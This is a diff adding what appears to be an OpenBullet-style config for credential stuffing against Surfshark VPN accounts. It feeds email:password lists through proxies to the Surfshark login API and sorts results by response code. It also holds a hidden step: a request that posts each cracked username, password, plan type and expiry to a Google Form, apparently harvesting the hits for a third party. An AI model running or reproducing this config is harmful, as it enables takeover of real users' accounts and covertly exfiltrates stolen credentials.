@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Surfshark",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-3T17:02:06.6366534+08:00",
+  "AdditionalInfo": "",
+  "Author": "ww",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "RandomUA" 
+
+REQUEST POST "https://account.surfshark.com/api/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <RandomUA>" 
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "origin: https://account.surfshark.com" 
+  HEADER "referer: https://account.surfshark.com/login" 
+  HEADER "ss-cur: USD" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "502 Remote site or proxy node error" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":" 
+
+REQUEST GET "https://docs.google.com/forms/d/e/1FAIpQLSfFoucbuEUE-nQYzb0902YyE_-3hJK5zY8bO3ByrztqR5C3xg/viewform" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CAPTURE REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLSfFoucbuEUE-nQYzb0902YyE_-3hJK5zY8bO3ByrztqR5C3xg/formResponse" 
+  CONTENT "entry.2133963292=<USER>:<PASS>***Type:<Type>***Expires:<Expires>***Subscription:<Subscription>&fvv=1&pageHistory=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
